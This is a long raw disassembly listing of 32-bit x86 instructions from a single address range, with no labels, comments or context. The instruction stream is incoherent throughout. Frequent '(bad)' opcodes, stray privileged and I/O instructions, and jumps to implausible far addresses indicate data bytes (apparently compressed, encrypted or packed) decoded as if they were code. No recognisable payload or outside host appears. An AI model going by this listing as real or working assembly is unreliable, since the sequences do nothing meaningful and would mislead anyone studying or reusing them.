  412b87:	mov    edi,0x25ab5584
  412b8c:	xchg   ebx,esp
  412b8e:	and    BYTE PTR [esi-0x7d],ch
  412b91:	ret    0xdf51
  412b94:	lods   eax,DWORD PTR ds:[esi]
  412b95:	test   DWORD PTR [eax+eax*1-0x33],ebx
  412b99:	dec    edi
  412b9a:	scas   al,BYTE PTR es:[edi]
  412b9b:	dec    ebp
  412b9c:	mov    ah,0xe9
  412b9e:	mov    ds:0x7d26da0e,al
  412ba3:	adc    eax,0x596dcf2
  412ba8:	outs   dx,DWORD PTR ds:[esi]
  412ba9:	ins    DWORD PTR es:[edi],dx
  412baa:	push   cs
  412bab:	repz pop ss
  412bad:	xchg   ebx,eax
  412bae:	pop    edx
  412baf:	push   ds
  412bb0:	and    edx,DWORD PTR [esi+0x62]
  412bb3:	mov    ebp,0x2b195d96
  412bb8:	leave  
  412bb9:	jecxz  0x412bf8
  412bbb:	loope  0x412b65
  412bbd:	imul   ebx,edi,0xffffff84
  412bc0:	imul   ebx
  412bc2:	cdq    
  412bc3:	into   
  412bc4:	sti    
  412bc5:	loop   0x412b4a
  412bc7:	push   esp
  412bc8:	push   ebp
  412bc9:	xchg   ebp,eax
  412bca:	xchg   esi,eax
  412bcb:	jbe    0x412c2e
  412bcd:	mov    ds:0x826a46ff,al
  412bd2:	aas    
  412bd3:	sub    esp,DWORD PTR [ebx]
  412bd5:	int    0x4c
  412bd7:	push   cs
  412bd8:	jmp    0x45360707
  412bdd:	in     eax,dx
  412bde:	xor    al,0x21
  412be0:	mov    ah,al
  412be2:	ja     0x412b64
  412be4:	sahf   
  412be5:	mov    DWORD PTR [eax],ebp
  412be7:	or     eax,0xfb3ebcf3
  412bec:	(bad)  
  412bed:	cs cli 
  412bef:	std    
  412bf0:	jl     0x412bb6
  412bf2:	retf   
  412bf3:	shl    BYTE PTR [eax],cl
  412bf5:	xchg   edi,eax
  412bf6:	test   DWORD PTR [edi+0x5d50f632],esi
  412bfc:	pop    ebx
  412bfd:	mov    bh,0xf9
  412bff:	add    bh,ch
  412c01:	hlt    
  412c02:	mov    cs,ebx
  412c04:	push   eax
  412c05:	into   
  412c06:	fwait
  412c07:	mov    ch,0xf1
  412c0a:	mov    ds:0x5550ee54,al
  412c0f:	repz loop 0x412bf3
  412c12:	add    eax,0x7280b8a3
  412c17:	imul   ecx,DWORD PTR [eax+0x72890918],0xbbc1637f
  412c21:	int    0xcf
  412c23:	sub    eax,0x86556561
  412c28:	and    ebx,DWORD PTR [edi+ebx*1]
  412c2b:	mov    bh,al
  412c2d:	mov    eax,0x4ed2ea21
  412c32:	rcl    DWORD PTR [ebx-0x23ed82f6],1
  412c38:	dec    si
  412c3a:	pop    ebx
  412c3b:	fadd   DWORD PTR [ebp+0x18]
  412c3e:	(bad)  
  412c3f:	iret   
  412c40:	cli    
  412c41:	mov    edx,esi
  412c43:	pop    ecx
  412c44:	rol    esi,0x78
  412c47:	je     0x412bea
  412c49:	shr    BYTE PTR [edi],1
  412c4b:	xchg   ebp,eax
  412c4c:	inc    esi
  412c4d:	add    eax,0x3b61d46f
  412c52:	pop    eax
  412c53:	mov    ah,0xbd
  412c55:	jne    0x412c24
  412c57:	mov    ebp,0xfdaead1
  412c5c:	fisttp WORD PTR [ebp-0x73]
  412c5f:	xchg   ebx,eax
  412c60:	cmp    eax,0x652be7b1
  412c65:	inc    esi
  412c66:	je     0x412c75
  412c68:	and    DWORD PTR [ebp-0xadc2bd8],edi
  412c6e:	ffreep st(7)
  412c70:	lods   eax,DWORD PTR ds:[esi]
  412c71:	(bad)  
  412c72:	xlat   BYTE PTR ds:[ebx]
  412c73:	pop    ebp
  412c74:	mov    al,ds:0x8a279850
  412c79:	iret   
  412c7a:	ror    ah,cl
  412c7c:	xchg   esp,eax
  412c7d:	adc    eax,0x7aad1124
  412c82:	test   DWORD PTR gs:[ebx+0x62],esp
  412c86:	cmp    eax,DWORD PTR ds:0xd117b8af
  412c8c:	sbb    al,BYTE PTR [edi-0x4c367a12]
  412c92:	retf   
  412c93:	push   esi
  412c94:	in     al,0xba
  412c96:	jge    0x412c55
  412c98:	shl    DWORD PTR [eax+eiz*4+0x2fbd8c19],cl
  412c9f:	int    0x6a
  412ca1:	xor    eax,0x85b208b9
  412ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ca7:	and    al,0xaf
  412ca9:	test   DWORD PTR [esi-0x777128a0],0xe3b9116e
  412cb3:	pop    esp
  412cb4:	and    al,0x2a
  412cb6:	pop    ebp
  412cb7:	xchg   edi,eax
  412cb8:	dec    edi
  412cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cba:	xchg   ebp,eax
  412cbb:	outs   dx,DWORD PTR ds:[esi]
  412cbc:	fst    QWORD PTR [edi-0x6f]
  412cbf:	test   BYTE PTR [ecx+0x48],dl
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	cmp    edi,DWORD PTR [ebx]
  412cc5:	repnz mov gs,WORD PTR [eax+0x17]
  412cc9:	cld    
  412cca:	jmp    0x9b37d431
  412ccf:	mov    ds:0xd6a75340,eax
  412cd4:	ror    BYTE PTR [ebx-0x48312cbc],1
  412cda:	leave  
  412cdb:	inc    ecx
  412cdc:	xchg   BYTE PTR [edi],cl
  412cde:	xchg   edi,eax
  412cdf:	out    0x4c,al
  412ce1:	cmp    al,0x5a
  412ce3:	(bad)  
  412ce4:	pop    edx
  412ce5:	ficom  WORD PTR [eax-0x6a08bd35]
  412ceb:	push   ebx
  412cec:	pop    ss
  412ced:	cwde   
  412cee:	cmp    ecx,ebx
  412cf0:	sbb    BYTE PTR [esi-0x5fc3263f],cl
  412cf6:	sahf   
  412cf7:	mov    eax,0xa108e0fd
  412cfc:	sbb    cl,BYTE PTR [esi+0x38]
  412cff:	add    DWORD PTR [ebx+0x62],esi
  412d02:	les    edx,FWORD PTR [ecx+0x1008796c]
  412d08:	and    DWORD PTR [edx+ecx*4-0x5f],esi
  412d0c:	adc    eax,0x8d1d87bf
  412d11:	jl     0x412d4f
  412d13:	adc    DWORD PTR [edi-0x5f],esi
  412d16:	bound  ebx,QWORD PTR ds:0x24711c97
  412d1c:	stc    
  412d1d:	iret   
  412d1e:	push   cs
  412d1f:	lock aam 0x2
  412d22:	mov    ecx,0xd1fba559
  412d27:	ins    BYTE PTR es:[edi],dx
  412d28:	xchg   ebx,eax
  412d29:	stc    
  412d2a:	and    eax,0x7cbdc3e8
  412d2f:	dec    edi
  412d30:	(bad)  
  412d32:	or     esp,DWORD PTR [eax]
  412d34:	retf   
  412d35:	mov    ch,0x3e
  412d37:	rcr    BYTE PTR [ecx],0x8a
  412d3a:	pop    esi
  412d3b:	stos   BYTE PTR es:[edi],al
  412d3c:	loopne 0x412cc8
  412d3e:	fst    DWORD PTR [ecx*1+0x5938aa7a]
  412d45:	cmp    ah,bl
  412d47:	xchg   ebp,eax
  412d48:	mov    esi,0x55b8f916
  412d4d:	fbstp  TBYTE PTR [ebx+0x4]
  412d50:	pop    esp
  412d51:	xchg   BYTE PTR [ecx-0x58],ch
  412d54:	(bad)  
  412d55:	adc    BYTE PTR [ebx-0x3f],ah
  412d58:	push   cs
  412d59:	call   0x7cf6:0x6106a54
  412d60:	cmp    ah,bl
  412d62:	cs mov bh,0x33
  412d65:	xchg   DWORD PTR [eax+0x5f],eax
  412d68:	cmp    BYTE PTR [ecx+0x323d4f22],dh
  412d6e:	cmp    eax,0x13e1731c
  412d73:	add    DWORD PTR [esi],esi
  412d75:	sar    BYTE PTR [ecx+eiz*4-0x50],0x2f
  412d7a:	into   
  412d7b:	or     BYTE PTR ds:0xe02292ee,bh
  412d81:	or     ebp,0x8d06e6af
  412d87:	popf   
  412d88:	in     al,0xd1
  412d8a:	aas    
  412d8b:	mov    ch,0x64
  412d8d:	out    0x7c,eax
  412d8f:	fstp   QWORD PTR [eax+0x3226c6b6]
  412d95:	cmp    ch,ah
  412d97:	sahf   
  412d98:	pop    esp
  412d99:	mov    cl,0xda
  412d9b:	sub    esi,DWORD PTR [si-0x21]
  412d9f:	xor    al,0xb4
  412da1:	jecxz  0x412d46
  412da3:	mov    ebp,0xca2f31bb
  412da8:	xchg   BYTE PTR [ebx+ebp*8+0x26145ac],bh
  412daf:	inc    ebp
  412db0:	jmp    FWORD PTR [ecx-0x40]
  412db3:	mov    ebp,fs
  412db5:	test   BYTE PTR [ebx-0x51],0xbb
  412db9:	push   esp
  412dba:	cmp    eax,0x2935aba3
  412dbf:	leave  
  412dc0:	mov    eax,ds:0x837f81df
  412dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dc6:	outs   dx,DWORD PTR ds:[esi]
  412dc7:	loopne 0x412e12
  412dc9:	push   0xd9d7f695
  412dce:	xchg   edi,eax
  412dcf:	inc    edx
  412dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dd1:	cmp    DWORD PTR [ecx+0x11bfc393],edx
  412dd7:	rcl    ah,0x5d
  412dda:	loope  0x412d93
  412ddc:	in     al,dx
  412ddd:	xchg   ebp,eax
  412dde:	add    esp,DWORD PTR ds:0x8353f797
  412de4:	into   
  412de5:	or     eax,0x15293fd0
  412dea:	bound  ecx,QWORD PTR [edx+0x59]
  412ded:	inc    edi
  412dee:	loopne 0x412e1c
  412df0:	mov    BYTE PTR [ebx-0x35],ch
  412df3:	xor    DWORD PTR [ebp+0x5d],ebx
  412df6:	jno    0x412e3c
  412df8:	pop    edi
  412df9:	clc    
  412dfa:	xor    ebp,ebp
  412dfc:	mov    al,0x33
  412dfe:	mov    esi,0x3aacba75
  412e03:	mov    al,0xf8
  412e05:	mov    dh,0x43
  412e07:	xchg   ebp,eax
  412e08:	dec    ebp
  412e09:	jg     0x412e22
  412e0b:	xor    ch,BYTE PTR [ebx+0x5b54859b]
  412e11:	ss and eax,0xae7f0ad9
  412e17:	cld    
  412e18:	adc    BYTE PTR [ebp-0x3783965],al
  412e1e:	dec    ebp
  412e1f:	adc    eax,0x27506066
  412e24:	std    
  412e25:	mov    edx,0x1876fb4f
  412e2a:	sub    DWORD PTR [eax],esi
  412e2c:	push   ss
  412e2d:	mov    esp,ss
  412e2f:	test   DWORD PTR [edx-0x2135ae0f],eax
  412e35:	pop    eax
  412e36:	adc    al,dh
  412e38:	cli    
  412e39:	shr    DWORD PTR [ebx+0x2],1
  412e3c:	dec    edi
  412e3d:	xor    eax,0x3cf542be
  412e42:	jmp    0x9c9a:0x15b46a
  412e49:	push   ecx
  412e4a:	pop    ss
  412e4b:	lea    ecx,[edx]
  412e4d:	mov    ch,0x7
  412e4f:	dec    edi
  412e50:	add    dl,al
  412e52:	add    BYTE PTR [ebp+eiz*1-0x2b26ba5c],bl
  412e59:	int    0xed
  412e5b:	add    eax,0x5c0f5817
  412e60:	pop    esi
  412e61:	sub    BYTE PTR [esi-0x68d90a73],ch
  412e67:	sub    ah,BYTE PTR [edi]
  412e69:	lea    ecx,[edi-0x16307692]
  412e6f:	bound  edi,QWORD PTR [esi+eax*1]
  412e72:	dec    eax
  412e73:	jge    0x412ea9
  412e75:	jae    0x412e61
  412e77:	jo     0x412e2e
  412e79:	mov    esi,0xc8f4aae8
  412e7e:	push   edx
  412e7f:	aam    0x1c
  412e81:	scas   al,BYTE PTR es:[edi]
  412e82:	iret   
  412e83:	mov    es,WORD PTR [ebx+0x7a9c47d6]
  412e89:	push   cs
  412e8a:	mov    ebp,0x5d1c05f9
  412e8f:	add    DWORD PTR [eax],0xffffff97
  412e92:	push   ecx
  412e93:	pop    ebx
  412e94:	mov    edi,0xfa9019c0
  412e99:	mov    ds:0xf8d48085,al
  412e9e:	call   0xeb79:0xd2e83c13
  412ea5:	jmp    0x51ee:0x1cfeacb0
  412eac:	ret    0xc702
  412eaf:	cmp    eax,0xe2adb2ab
  412eb4:	sub    BYTE PTR [ebp-0x5e],0xe5
  412eb8:	push   eax
  412eb9:	test   eax,ebp
  412ebb:	out    dx,eax
  412ebc:	jecxz  0x412ec2
  412ebe:	jge    0x412f1b
  412ec0:	inc    ebp
  412ec1:	(bad)  
  412ec2:	shr    dl,0xef
  412ec5:	mov    edx,0x4483f65b
  412eca:	add    eax,DWORD PTR [esi+0x73247e0e]
  412ed0:	in     al,dx
  412ed1:	fsubr  QWORD PTR [ecx+0x4dd93862]
  412ed7:	xchg   edx,eax
  412ed8:	push   edi
  412ed9:	pop    esp
  412eda:	sti    
  412edb:	pop    ss
  412edc:	xchg   esp,eax
  412edd:	mov    eax,0xcb1b663b
  412ee2:	enter  0xd23e,0x61
  412ee6:	push   ebx
  412ee7:	mov    ds:0xacc62459,eax
  412eec:	dec    esp
  412eed:	(bad)  
  412eee:	loopne 0x412ebb
  412ef0:	xchg   esp,eax
  412ef1:	and    al,0x5
  412ef3:	fsubr  QWORD PTR [ebp-0x19139757]
  412ef9:	arpl   WORD PTR ds:0x6220fb60,di
  412eff:	xchg   ebx,eax
  412f00:	sar    BYTE PTR [ecx+ecx*2-0x377be9da],cl
  412f07:	mov    cl,0xd9
  412f09:	int    0x17
  412f0b:	mov    ebp,0xbdb3b065
  412f10:	js     0x412f38
  412f12:	push   es
  412f13:	aam    0x5c
  412f15:	shl    DWORD PTR [ebp-0x6f],cl
  412f18:	(bad)  
  412f19:	aas    
  412f1a:	xlat   BYTE PTR ds:[ebx]
  412f1b:	aas    
  412f1c:	inc    edx
  412f1d:	fistp  QWORD PTR [ebp+0x3447fa39]
  412f23:	push   es
  412f24:	add    esi,DWORD PTR [esi-0x32]
  412f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f28:	mov    esi,0x772f559d
  412f2d:	sub    bl,BYTE PTR [ecx-0x44a53eb3]
  412f33:	stos   BYTE PTR es:[edi],al
  412f34:	je     0x412f6e
  412f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f37:	in     eax,dx
  412f38:	les    ebp,FWORD PTR [ebx]
  412f3a:	in     al,0xf8
  412f3c:	daa    
  412f3d:	xor    eax,edi
  412f3f:	pop    ebp
  412f40:	pusha  
  412f41:	or     DWORD PTR [ebp-0x43fe50bd],ecx
  412f47:	inc    ebx
  412f48:	ret    0x6b1
  412f4b:	rcr    DWORD PTR [edx+0x1ccf3c0],1
  412f51:	push   ds
  412f52:	sub    ebx,ebp
  412f54:	push   ss
  412f55:	not    BYTE PTR [esi+ebx*8-0x5a]
  412f59:	mov    BYTE PTR [esi],ah
  412f5b:	cmp    eax,0x83b8781c
  412f60:	push   edi
  412f61:	pusha  
  412f62:	cmp    eax,0xac95331c
  412f67:	mov    edi,0x6f91a904
  412f6c:	sahf   
  412f6d:	retf   
  412f6e:	jns    0x412fa1
  412f70:	sub    al,BYTE PTR [ebx]
  412f72:	jle    0x412f7e
  412f74:	retf   
  412f75:	mov    ebp,gs
  412f77:	ss jne 0x412f38
  412f7a:	hlt    
  412f7b:	dec    ebx
  412f7c:	test   BYTE PTR [ecx+0x4e7c7c44],ah
  412f82:	hlt    
  412f83:	pop    ebp
  412f84:	and    eax,0xb4644d99
  412f89:	inc    esp
  412f8a:	dec    ebx
  412f8b:	jmp    0xfc23706b
  412f90:	cmc    
  412f91:	div    DWORD PTR [eax+0x6a]
  412f94:	push   cs
  412f95:	xchg   edi,eax
  412f96:	adc    al,0x2f
  412f98:	cmp    eax,0x1978b5fd
  412f9d:	jle    0x412fbb
  412f9f:	jnp    0x412f42
  412fa1:	aaa    
  412fa2:	(bad)  
  412fa3:	iret   
  412fa4:	jg     0x412f4b
  412fa6:	arpl   WORD PTR [edx+eiz*4],dx
  412fa9:	jmp    DWORD PTR [ebx+eiz*2]
  412fac:	mov    edx,0xd38d15ff
  412fb1:	mov    WORD PTR [esp+esi*1+0x3a2d4537],ss
  412fb8:	push   ebp
  412fb9:	inc    ecx
  412fba:	adc    DWORD PTR [ecx+0x4934ce6e],ecx
  412fc0:	jno    0x412f6f
  412fc2:	fsub   st,st(6)
  412fc4:	push   ebx
  412fc5:	mov    ds:0x6aca027e,al
  412fca:	mov    eax,0xab9d1be9
  412fcf:	push   eax
  412fd0:	dec    edi
  412fd1:	cdq    
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	pop    ebp
  412fd4:	inc    ecx
  412fd5:	dec    esi
  412fd6:	jmp    0x412f9e
  412fd8:	sub    ebp,DWORD PTR [edx-0x4c0e9ba3]
  412fde:	add    bh,BYTE PTR [ecx+ebx*1]
  412fe1:	adc    eax,0x7763c234
  412fe6:	mov    edx,0x49ad748f
  412feb:	inc    ebp
  412fec:	mov    ebp,0xf2d477f2
  412ff1:	out    0x3b,eax
  412ff3:	pop    esi
  412ff4:	push   ss
  412ff5:	push   0x16
  412ff7:	add    BYTE PTR [ebx-0x58],ah
  412ffa:	test   eax,0x2c7f6ad5
  412fff:	and    DWORD PTR [ebx+0x2c8e7a85],edi
  413005:	fst    DWORD PTR [edx+0x54]
  413008:	shr    BYTE PTR [esi-0x28],1
  41300b:	or     BYTE PTR [edx-0x31],al
  41300e:	repz sbb DWORD PTR [eax-0x49],edx
  413012:	imul   edi,DWORD PTR ds:0x6335d992,0xfca9f1cf
  41301c:	ss mov ch,0x27
  41301f:	xchg   cl,dh
  413021:	or     BYTE PTR [ecx],0xad
  413024:	icebp  
  413025:	repnz dec ebx
  413027:	inc    ecx
  413028:	add    DWORD PTR [edi],ecx
  41302a:	cmc    
  41302b:	mov    bh,0x32
  41302d:	bound  ecx,QWORD PTR ds:0x3b2387eb
  413033:	out    dx,eax
  413034:	out    0xad,al
  413036:	jp     0x413067
  413038:	call   0xbfbc5435
  41303d:	sbb    BYTE PTR [ebp-0x20d972ff],dl
  413043:	pop    ebx
  413044:	sbb    BYTE PTR [edx+0x39],cl
  413047:	mov    ecx,0xc4cb1050
  41304c:	stos   DWORD PTR es:[edi],eax
  41304d:	cmp    ah,BYTE PTR [edi+0x5223495a]
  413053:	sbb    DWORD PTR [ecx],edi
  413055:	sub    DWORD PTR [ebp+0x1a],ecx
  413058:	mov    eax,0xa43e7f6e
  41305d:	adc    al,0xea
  41305f:	ret    0xe957
  413062:	jecxz  0x41309b
  413064:	int3   
  413065:	jae    0x41307f
  413067:	loope  0x4130a5
  413069:	sub    eax,0xfadea47d
  41306e:	mov    WORD PTR [ebp+ecx*1-0xa],gs
  413072:	mov    bh,0x8b
  413074:	mov    ebp,0x9d73bfb1
  413079:	aas    
  41307a:	add    ch,BYTE PTR [ebx]
  41307c:	int3   
  41307d:	(bad)  
  41307e:	jmp    0x2d96b08f
  413083:	cmp    ebx,DWORD PTR [ebp+0x9]
  413086:	mov    bh,0xba
  413088:	das    
  413089:	hlt    
  41308a:	jns    0x41304f
  41308c:	sub    edx,DWORD PTR [ecx+0x34a7b413]
  413092:	add    ah,BYTE PTR [edi+ebx*8-0x7]
  413096:	aaa    
  413097:	rcl    BYTE PTR [edi],0x72
  41309a:	cmp    esi,esi
  41309c:	jo     0x4130f6
  41309e:	mov    ?,WORD PTR [edx]
  4130a0:	shl    DWORD PTR [edx+0x2840b7b6],0x3c
  4130a7:	scas   eax,DWORD PTR es:[edi]
  4130a8:	pop    edi
  4130a9:	clc    
  4130aa:	and    dl,BYTE PTR [esi+0x5a]
  4130ad:	js     0x413062
  4130af:	cli    
  4130b0:	lds    edx,FWORD PTR [edi]
  4130b2:	jne    0x4130fc
  4130b4:	std    
  4130b5:	adc    eax,0xb719b7c3
  4130ba:	or     eax,0x3d1cdb5b
  4130bf:	clc    
  4130c0:	mov    ds:0x73cc0d33,al
  4130c5:	or     eax,0xff8e481c
  4130ca:	stos   BYTE PTR es:[edi],al
  4130cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130cc:	xor    eax,0xc89d2abd
  4130d1:	inc    esi
  4130d2:	xchg   ebp,eax
  4130d3:	pusha  
  4130d4:	sbb    DWORD PTR [ebx+0x29],0x5d
  4130d8:	cmp    BYTE PTR [esp+ecx*1+0xa],0xa6
  4130dd:	jp     0x413072
  4130df:	mov    dl,0xa5
  4130e1:	repnz xchg esi,eax
  4130e3:	pop    edx
  4130e4:	push   edi
  4130e5:	cwde   
  4130e6:	push   ds
  4130e7:	fst    DWORD PTR [esp+eiz*4+0x7f]
  4130eb:	shr    BYTE PTR es:0x83da97a,cl
  4130f2:	push   esp
  4130f3:	in     eax,0x2f
  4130f5:	adc    eax,0x3dff23d5
  4130fa:	mov    ebp,0xfdc3ed0e
  4130ff:	xchg   esp,eax
  413100:	mov    ecx,0xa2b4afcc
  413105:	jg     0x41308b
  413107:	xchg   DWORD PTR [edi-0x488be0fe],ebp
  41310d:	add    BYTE PTR [esi-0x16],bl
  413110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413111:	xor    eax,0x29b66e05
  413116:	xor    BYTE PTR [eax-0xd],bl
  413119:	inc    esi
  41311a:	mov    fs,WORD PTR [esi+0x75]
  41311d:	pop    esi
  41311e:	adc    eax,0xbc1746e7
  413123:	cld    
  413124:	mov    eax,0xd887db90
  413129:	adc    al,0x3f
  41312c:	mov    ecx,0x4e6c750e
  413131:	adc    cl,BYTE PTR [ebx-0x1de6a098]
  413137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413138:	(bad)  
  413139:	cmp    BYTE PTR [edx-0x19],cl
  41313c:	repz (bad) 
  41313e:	jbe    0x4131bf
  413140:	mov    esp,0x6dc2f546
  413145:	sbb    ebp,DWORD PTR [edi+0x6c2c4140]
  41314b:	inc    ebp
  41314c:	sub    al,0xad
  41314e:	xchg   ecx,eax
  41314f:	shr    ch,1
  413151:	test   eax,0xc9cdca59
  413156:	jbe    0x413191
  413158:	iret   
  413159:	dec    esp
  41315a:	enter  0x127f,0xe4
  41315e:	mov    bl,0x2d
  413160:	sbb    DWORD PTR [esi-0x17],ebp
  413163:	in     eax,0x57
  413165:	(bad)  
  413166:	push   0xb46b7829
  41316b:	mov    esp,0x4e89490b
  413170:	dec    edi
  413171:	mov    dh,BYTE PTR [eax+0x67d4cd22]
  413177:	dec    esi
  413178:	fist   DWORD PTR [ebp+0x55ccc79]
  41317e:	jnp    0x413193
  413180:	ror    DWORD PTR [ebx+0x16a62f2a],0xe6
  413187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413188:	jl     0x4131b0
  41318a:	sbb    ch,BYTE PTR [ebp+0x4bf9c5db]
  413190:	xor    DWORD PTR [edi+0x1f0473bd],ebx
  413196:	pop    esi
  413197:	push   esi
  413198:	inc    edi
  413199:	mov    ebx,0x9e57bf2
  41319e:	js     0x4131cc
  4131a0:	xchg   esi,eax
  4131a1:	mov    esp,0x799afff5
  4131a6:	jl     0x4131bb
  4131a8:	and    al,0xde
  4131aa:	xchg   DWORD PTR [ecx],ebp
  4131ac:	mov    ds:0x58ef9dff,eax
  4131b1:	xchg   esi,eax
  4131b2:	mov    cl,0x1e
  4131b4:	sub    eax,0xeb512fc0
  4131b9:	inc    edx
  4131ba:	mov    ecx,0x4176e691
  4131bf:	ja     0x4131cb
  4131c1:	fld    TBYTE PTR [ebx-0x69]
  4131c4:	cmp    DWORD PTR [esi+0x41289e7],esp
  4131ca:	mov    ds:0x28385d84,eax
  4131cf:	xchg   edi,eax
  4131d0:	sti    
  4131d1:	mov    al,ds:0x2c7accf8
  4131d6:	clc    
  4131d7:	jg     0x413207
  4131d9:	jo     0x4131ad
  4131db:	mov    bh,0x9b
  4131dd:	push   edi
  4131de:	out    dx,eax
  4131df:	cmp    BYTE PTR [ebp-0x63],al
  4131e2:	inc    ebp
  4131e3:	iret   
  4131e4:	fmul   QWORD PTR [eax]
  4131e6:	mov    BYTE PTR [ecx+0x65],cl
  4131e9:	dec    ecx
  4131ea:	fimul  DWORD PTR [ebp+0x670d20fc]
  4131f0:	mov    ch,0xbf
  4131f2:	(bad)  
  4131f4:	adc    bl,BYTE PTR [ecx+0x59]
  4131f7:	xor    eax,0x533bff25
  4131fc:	xchg   ebp,eax
  4131fd:	xchg   DWORD PTR [edx-0x6f],eax
  413200:	mov    ebx,0x518cc199
  413205:	cmp    eax,0x4d2bb925
  41320a:	pop    esi
  41320b:	inc    edx
  41320c:	sti    
  41320d:	xchg   ecx,eax
  41320e:	data16 jns 0x4131be
  413211:	sti    
  413212:	mov    esp,0xfbced6e5
  413217:	popf   
  413218:	mov    al,0x9d
  41321a:	xor    DWORD PTR [edx+0x565a7acb],ecx
  413220:	imul   ecx,DWORD PTR [edx+0x40d06a1d],0xffffffa5
  413227:	daa    
  413228:	ret    
  413229:	ret    
  41322a:	xor    BYTE PTR [ecx-0x3a7dcd7f],dh
  413230:	pop    ecx
  413231:	sbb    esp,DWORD PTR [ecx-0xce1d8a]
  413237:	arpl   WORD PTR [esi+eiz*4],bp
  41323a:	in     al,dx
  41323b:	sti    
  41323c:	jbe    0x4131f2
  41323e:	jo     0x41326e
  413240:	add    BYTE PTR [edi-0x44],cl
  413243:	and    ch,0x2a
  413246:	bound  esi,QWORD PTR [ebp+0x57]
  413249:	dec    ecx
  41324a:	sub    DWORD PTR [edi],0x58e63561
  413250:	cmp    ebp,DWORD PTR [edi-0x4746dce3]
  413256:	(bad)  
  413257:	sbb    DWORD PTR [esi],ebp
  413259:	cwde   
  41325a:	jge    0x4132d5
  41325c:	xlat   BYTE PTR ds:[ebx]
  41325d:	dec    esp
  41325e:	inc    edi
  41325f:	mov    ebp,0x220577a3
  413264:	icebp  
  413265:	add    al,0x31
  413267:	(bad)  
  413268:	jle    0x41320a
  41326a:	and    ch,bh
  41326c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41326d:	mov    eax,0x14f6d3f2
  413272:	mov    ds:0xb58d6c05,al
  413277:	push   ecx
  413278:	test   eax,0x2f8b11f
  41327d:	sbb    DWORD PTR [esi-0x604b78ef],ecx
  413283:	sbb    dl,BYTE PTR [ecx]
  413285:	pop    ds
  413286:	aas    
  413287:	test   eax,0x565c71ea
  41328c:	fisub  WORD PTR fs:[esp+esi*4]
  413290:	mov    bh,0x94
  413292:	int    0xd0
  413294:	inc    esp
  413295:	or     esp,DWORD PTR ds:0x53605079
  41329b:	cmp    eax,0xda511e3f
  4132a0:	pusha  
  4132a1:	and    bl,cl
  4132a3:	or     DWORD PTR [edi+ebp*4],0xb6e174e9
  4132aa:	xor    DWORD PTR [esi+eiz*8],0x3af73ac2
  4132b1:	iret   
  4132b2:	ficomp WORD PTR [eax+eiz*1+0xa]
  4132b6:	dec    edi
  4132b7:	push   ebp
  4132b8:	loop   0x41326a
  4132ba:	cwde   
  4132bb:	mov    al,ds:0xd26ba7dc
  4132c0:	cmp    eax,0xafd6d4ed
  4132c5:	(bad)  
  4132c6:	fnstenv [esi+edi*8+0x7]
  4132ca:	jl     0x413260
  4132cc:	mov    ecx,0x9396cf61
  4132d1:	xrelease xchg BYTE PTR [esi],ch
  4132d4:	xor    cl,bl
  4132d6:	lds    esi,FWORD PTR [ebx-0x718e40ec]
  4132dc:	mov    eax,ds:0xf7c04598
  4132e1:	cmp    ebx,eax
  4132e3:	add    eax,0xe2872757
  4132e8:	xchg   ebx,eax
  4132e9:	loope  0x4132a2
  4132eb:	cli    
  4132ec:	dec    esi
  4132ed:	(bad)  
  4132ee:	daa    
  4132ef:	sahf   
  4132f0:	cmp    bl,BYTE PTR [edi-0x3f]
  4132f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132f4:	stos   BYTE PTR es:[edi],al
  4132f5:	fwait
  4132f6:	les    edx,FWORD PTR [ecx-0x357e7ef1]
  4132fc:	mov    ds:0x422b2a70,eax
  413301:	adc    al,0x61
  413303:	mov    al,0x56
  413305:	mov    dh,BYTE PTR [eax]
  413307:	or     al,BYTE PTR [edi+0x6e5611c2]
  41330d:	pop    esi
  41330e:	cld    
  41330f:	ss aam 0xb
  413312:	shl    esp,1
  413314:	das    
  413315:	sub    eax,0xa09627cb
  41331a:	mov    cl,0xdc
  41331c:	add    bl,BYTE PTR [ebx+0x56c0b9d9]
  413322:	ins    BYTE PTR es:[edi],dx
  413323:	xor    al,dl
  413325:	add    BYTE PTR [ecx+0x2bb4a5de],al
  41332b:	xchg   DWORD PTR [ecx+esi*8],esp
  41332e:	add    al,0x10
  413330:	sub    ebx,0x30
  413333:	add    al,0xd3
  413335:	pop    ebp
  413336:	sub    dl,BYTE PTR [eax]
  413338:	push   ecx
  413339:	into   
  41333a:	jb     0x4132ce
  41333c:	mov    dh,0xe5
  41333e:	push   esi
  41333f:	(bad)  
  413340:	sar    BYTE PTR [edi],cl
  413342:	sbb    al,0x3f
  413344:	sti    
  413345:	repz sub ah,al
  413348:	retf   
  413349:	push   cs
  41334a:	adc    al,0xf8
  41334c:	push   ss
  41334d:	mov    ah,0x72
  41334f:	mov    al,0x29
  413351:	out    0x16,eax
  413353:	scas   al,BYTE PTR es:[edi]
  413354:	popa   
  413355:	int3   
  413356:	push   edi
  413357:	stos   BYTE PTR es:[edi],al
  413358:	pop    edi
  413359:	shl    bh,0xf7
  41335c:	es xchg ebp,eax
  41335e:	cmp    al,0xf6
  413360:	mov    esi,0xaaa0c677
  413365:	and    esp,eax
  413367:	push   ebx
  413368:	push   edx
  413369:	cld    
  41336a:	xor    bh,BYTE PTR [ecx-0x5506a34b]
  413370:	and    ch,BYTE PTR [ecx-0x6c7116bc]
  413376:	stos   DWORD PTR es:[edi],eax
  413377:	dec    ebx
  413378:	mov    esp,eax
  41337a:	aad    0x38
  41337c:	in     al,0x4b
  41337e:	jecxz  0x413324
  413380:	jns    0x4133aa
  413382:	mov    eax,0xed2f7b
  413387:	sub    BYTE PTR [ebx-0x67ecbb51],cl
  41338d:	dec    ecx
  41338e:	dec    edx
  41338f:	in     al,0xf8
  413391:	dec    eax
